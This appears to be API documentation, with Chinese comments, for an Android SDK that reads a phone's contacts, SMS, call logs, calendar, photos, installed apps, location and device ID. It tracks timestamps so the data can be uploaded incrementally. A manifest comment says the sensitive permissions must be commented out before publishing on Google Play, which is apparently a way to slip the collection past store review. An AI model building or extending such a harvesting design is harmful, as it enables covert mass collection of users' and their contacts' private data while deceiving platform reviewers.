```kotlin
//保存上传信息
//keys = [app, call, photo, sms, calendar, contact]
//有更新时间用更新时间，否则用创建时间，否则用id
//注意日程的时间是 日程开始和结束时间，不是 创建时间，应该用id
//注意取列表的最后一项
{
    "calendar": 10001, // id
    "call": 1692242287, // time
    "contact": 1692242287, //last_time
    "sms": 1692242287, // time,
    "photo": 1692242287, // updateTime,
    "app": 1692242287, // createdAt
}
fun savePreferences(maps: Map<String, Any>)


//联系人列表
fun getContacts(onResult: (Result<List<Contact>>) -> Unit)

//日程列表
fun getCalendars(onResult: (Result<List<Calendar>>) -> Unit)

//短信
fun getMessages(onResult: (Result<List<Message>>) -> Unit)

//安装应用列表
fun getApps()

//相册
fun getPhotos(onResult: (Result<List<Photo>>) -> Unit)

//通话记录
fun getCallLogs(onResult: (Result<List<CallLogInfo>>) -> Unit)

//位置信息
fun getPosition(onResult: (Result<Position?>) -> Unit)

//本包信息
fun getPackageInfo()

//设备id Settings.Secure.ANDROID_ID，如果为空UUID
fun getDeviceId()
```



### 权限

```xml

<uses-feature
    android:name="android.hardware.telephony"
    android:required="false" />
<uses-feature
    android:name="android.hardware.camera"
    android:required="false" />

<!--  上架Google需注释下列权限  -->
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
<uses-permission
    android:name="android.permission.READ_EXTERNAL_STORAGE"
    android:maxSdkVersion="32" />
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.READ_CALENDAR" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission
    android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"
    tools:ignore="ProtectedPermissions" />
<uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" />
<uses-permission android:name="android.permission.BLUETOOTH" />
<uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
<uses-permission
    android:name="com.google.android.gms.permission.AD_ID"
    tools:ignore="WrongManifestParent" />

<!--  获取安装应用列表  -->
<queries>
    <intent>
        <action android:name="android.intent.action.MAIN"/>
    </intent>
</queries>

```

